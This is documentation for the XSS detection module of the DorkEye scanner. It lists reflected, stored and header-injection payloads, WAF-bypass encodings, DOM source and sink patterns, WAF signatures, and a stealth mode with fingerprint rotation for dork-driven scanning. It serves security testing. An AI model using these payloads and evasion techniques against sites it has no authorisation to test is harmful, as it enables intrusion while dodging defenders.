# XSS Detection — DorkEye v4.9

DorkEye includes a built-in multi-method XSS detection engine supporting reflected, stored, DOM-based, and header-based injection — no browser or external tool required.

---

## Enable XSS Testing

### During a dork search

```bash
python dorkeye.py -d "inurl:search.php?q=" --xss -o results.json
python dorkeye.py --dg=xss --mode=medium --xss --stealth -o results.json
```

### Direct test on a single URL

```bash
python dorkeye.py -u "https://example.com/search.php?q=test" --xss
python dorkeye.py -u "https://example.com/search.php?q=test" --xss --stealth -o result.json
```

### Re-test a saved results file

```bash
python dorkeye.py -f Dump/results.json --xss -o retest.json
```

### Select XSS type

```bash
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type reflected
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type dom
python dorkeye.py -u "https://example.com/?q=x" --xss --xss-type all   # default
```

---

## Architecture Overview

`Tools/xss_detector.py` is a self-contained module. Its main components:

| Component | Description |
|-----------|-------------|
| `XSSConfidence` | Enum: `none → low → medium → high → critical` |
| `XSSDetector` | Main class — orchestrates all detection methods |
| `CircuitBreaker` | Shared class from `sqli_detector` — tracks unreachable hosts |
| `HTTPFingerprintRotator` | Shared class from `sqli_detector` — rotates browser profiles per request |
| `WAF_SIGNATURES` | Shared dict from `sqli_detector` — 12 WAF signatures |
| `_interruptible_sleep` | Shared helper — sleeps in 0.25 s steps, honours interrupt flags |

---

## HTTP Fingerprint Rotation

Every outgoing GET and POST request automatically rotates its browser fingerprint using the shared `HTTPFingerprintRotator`, making scanner traffic indistinguishable from real browser activity.

The same `http_fingerprints.json` used by the SQLi module is reused — no separate config needed.

---

## Circuit Breaker

`XSSDetector` uses the shared `CircuitBreaker` class (not an inline set). Dead hosts are tracked at `scheme://netloc` granularity. Any `ConnectTimeout` or `ConnectionError` during `_run_interruptible()` automatically marks the host as dead.

```python
detector.circuit_breaker.reset()  # re-enable all hosts between scans
```

---

## Interrupt Flags

```python
_exit_requested: bool = False   # Ctrl+C → abort everything
_skip_current:   bool = False   # second Ctrl+C → skip current URL only
```

All in-loop sleeps use `_interruptible_sleep()` — never `time.sleep()` directly. Flags are checked at every payload iteration and sleep step.

---

## Timing Constants

| Constant | Value |
|----------|-------|
| `_CONNECT_TIMEOUT` | 4 s |
| `_DEFAULT_READ` | 8 s |

---

## Detection Methods

`XSSDetector` runs up to **4 methods** depending on the `xss_type` argument and parameter availability.

---

### 1. Reflected XSS

Injects payloads into GET parameters and checks for unescaped reflection in the HTML response body.

**Parameter pre-screening:** parameters are sorted by XSS attack-surface priority before testing. Testing stops on the first confirmed hit to minimize total requests.

**Payloads:**

```
<script>alert('DEXSS7x')</script>
"><script>alert("DEXSS7x")</script>
'><script>alert('DEXSS7x')</script>
<img src=x onerror=alert("DEXSS7x")>
<svg/onload=alert('DEXSS7x')>
"><img src=x onerror=alert("DEXSS7x")>
<details open ontoggle=alert('DEXSS7x')>
<body onload=alert("DEXSS7x")>
<iframe srcdoc="<script>alert('DEXSS7x')</script>">
"><svg onload=alert("DEXSS7x")>
';alert('DEXSS7x')//
";alert("DEXSS7x")//
`<script>alert('DEXSS7x')</script>`
```

**WAF bypass variants** (injected after the main set if no hit yet):

```
<ScRiPt>alert('DEXSS7x')</sCrIpT>
<img src=x oNeRrOr=alert("DEXSS7x")>
<svg/onload=&#97;lert('DEXSS7x')>
%3Cscript%3Ealert('DEXSS7x')%3C/script%3E
&#60;script&#62;alert('DEXSS7x')&#60;/script&#62;
\u003Cscript\u003Ealert('DEXSS7x')\u003C/script\u003E
```

**Reflection check:** the unique marker `DEXSS7x` must appear in the response body AND must NOT be surrounded by any known encoding pattern (HTML entities, URL encoding, Unicode escapes). Encoded reflections are treated as safe (no false positive).

**Encoded patterns that mark a reflection as safe:**

```
&lt;script    &lt;img    &lt;svg    &lt;iframe    &lt;details    &lt;body
&#60;    &#x3c;    %3Cscript    \u003C    &amp;lt;    \x3c
```

**CSP check:** the `Content-Security-Policy` response header is inspected. If a strict CSP is present, confidence is capped at MEDIUM regardless of unescaped reflection (finding is real but exploitability is limited).

Confidence: **HIGH** on unescaped reflection without CSP. **MEDIUM** if CSP is present.

---

### 2. Stored XSS

POSTs payloads to the URL, then refetches via GET and checks whether the marker survived in the persisted page.

Two-stage detection:

| Stage | Trigger | Confidence |
|-------|---------|------------|
| 1 — immediate echo | Marker found unescaped in the POST response | MEDIUM |
| 2 — true stored | Marker found unescaped in the subsequent GET response | HIGH |

**Payloads:**

```
<script>alert('DEXSS7x')</script>
<img src=x onerror=alert("DEXSS7x")>
<svg/onload=alert('DEXSS7x')>
```

**Parameter injection:** each parameter is tested individually (not blasted all at once), so the vulnerable field can be identified precisely.

---

### 3. DOM-based XSS

Fetches the page and performs static JavaScript source-to-sink analysis. No browser is required.

**Sources (attacker-controlled inputs):**

```
location.hash        location.search       location.href
document.URL         document.documentURI  document.referrer
window.name          history.state
```

**Sinks (dangerous output contexts):**

```
document.write(        document.writeln(      .innerHTML =
.outerHTML =           eval(                  setTimeout('
setInterval('          location.href =        location.assign(
location.replace(      insertAdjacentHTML(
.setAttribute('src'    .setAttribute('href'   .setAttribute('on*'
document.createElement('script'               .src = location|window
```

**Analysis scope:** inline `<script>` blocks are extracted first. If none are found, the full page body is used as fallback. External scripts referenced via `src=` attributes are fetched separately and included in the analysis.

**Confidence:**

| Condition | Confidence |
|-----------|------------|
| 1 source + 1 sink | LOW |
| 2+ sources OR 2+ sinks | MEDIUM |

---

### 4. Header-based XSS

Injects the XSS marker into HTTP request headers that are commonly reflected in error pages, logs, or debug output.

**Headers tested:**

```
X-Forwarded-For
Referer
User-Agent
X-Forwarded-Host
X-Original-URL
```

**Payload:** `<script>alert('DEXSS7x')</script>` injected into each header value while keeping all other headers normal.

Reflection check uses the same unescaped-marker logic as reflected XSS.

Confidence: **HIGH** on unescaped reflection.

---

## Parameter Prioritization

Parameters are sorted into three tiers before testing. XSS-specific priority differs from the SQLi order — reflection-prone and redirect parameters rank highest.

| Priority | Names |
|----------|-------|
| High | `q`, `query`, `search`, `s`, `keyword`, `kw`, `term`, `find`, `name`, `user`, `username`, `message`, `msg`, `comment`, `text`, `input`, `value`, `data`, `content`, `body`, `title`, `description`, `subject`, `note`, `info`, `redirect`, `url`, `next`, `return`, `callback`, `ref`, `goto`, `redir`, `dest`, `target`, `location` |
| Medium | `id`, `page`, `cat`, `category`, `type`, `lang`, `language`, `filter`, `tag`, `label`, `topic`, `section`, `email`, `mail`, `first`, `last`, `city`, `country`, `region` |
| Low | Everything else |

---

## WAF Detection

WAF checks run on the baseline response and on each injected response. Signatures are matched against header keys, header values, and the first 1500 chars of the body.

**Detected WAFs:**

| WAF | Detection signals |
|-----|-------------------|
| Cloudflare | `cf-ray`, `cloudflare` |
| Wordfence | `wordfence`, `generated by wordfence` |
| mod_security | `mod_security`, `modsecurity` |
| Sucuri | `x-sucuri-id`, `sucuri` |
| Imperva | `x-iinfo`, `incapsula` |
| Akamai | `akamai`, `x-akamai-transformed` |
| F5 BIG-IP | `x-waf-event-info`, `bigipserver` |
| Barracuda | `barra_counter_session`, `barracuda` |
| FortiWeb | `fortigate`, `fortiweb` |
| AWS WAF | `x-amzn-requestid` + status 403 |
| DenyAll | `denyall`, `x-denyall` |
| Reblaze | `x-reblaze-protection` |
| Generic | Status 403 / 406 / 429 + body < 600 chars |

When a WAF is detected, the current method is aborted for that URL.

---

## Scoring & Confidence Aggregation

`test_xss()` aggregates findings from all enabled methods. The `overall_confidence` is set to the **highest confidence** among all vulnerable tests.

| Level | Meaning |
|-------|---------|
| `critical` | Reflected or stored XSS confirmed with no CSP — direct exploitability |
| `high` | Unescaped reflection confirmed / true stored / header-based hit |
| `medium` | POST echo / DOM with multiple sources+sinks / reflected under CSP |
| `low` | DOM with single source+sink pair |

---

## Return Value Structure

`test_xss(url)` returns:

```json
{
  "tested":             true,
  "vulnerable":         true,
  "overall_confidence": "high",
  "xss_types_found":    ["reflected"],
  "waf_detected":       null,
  "csp_detected":       false,
  "tests": [
    {
      "type":       "reflected",
      "vulnerable": true,
      "confidence": "high",
      "parameters": ["q"],
      "payload":    "<script>alert('DEXSS7x')</script>",
      "evidence":   ["Unescaped reflection in param [q]: <script>alert('DEXSS7x')</script>"],
      "waf":        null
    },
    {
      "type":       "dom",
      "vulnerable": false,
      "confidence": "none",
      "sources":    [],
      "sinks":      [],
      "evidence":   [],
      "waf":        null
    }
  ],
  "message": "XSS detected — type(s): reflected  confidence: high"
}
```

---

## Stealth Mode

```bash
python dorkeye.py -u "https://example.com/?q=x" --xss --stealth
```

With `--stealth`:

| Phase | Normal | Stealth |
|-------|--------|---------|
| Between reflected payloads | — | 0.5–1.5 s |
| Between stored payloads | — | 1.0–2.5 s |
| Between header tests | — | 0.5–1.5 s |
| Fingerprint profiles | all | conservative browser profiles |

---

## Python API

```python
from Tools.xss_detector import XSSDetector

detector = XSSDetector(stealth=False, timeout=8, xss_type="all")

# Full test — all methods
result = detector.test_xss("https://example.com/search.php?q=hello")

# Reflected only
detector.xss_type = "reflected"
result = detector.test_xss("https://example.com/search.php?q=hello")

# Optional progress callback
detector._status_cb = lambda phase: print(f"[xss] {phase}")

# Reset circuit breaker between independent scans
detector.circuit_breaker.reset()
```
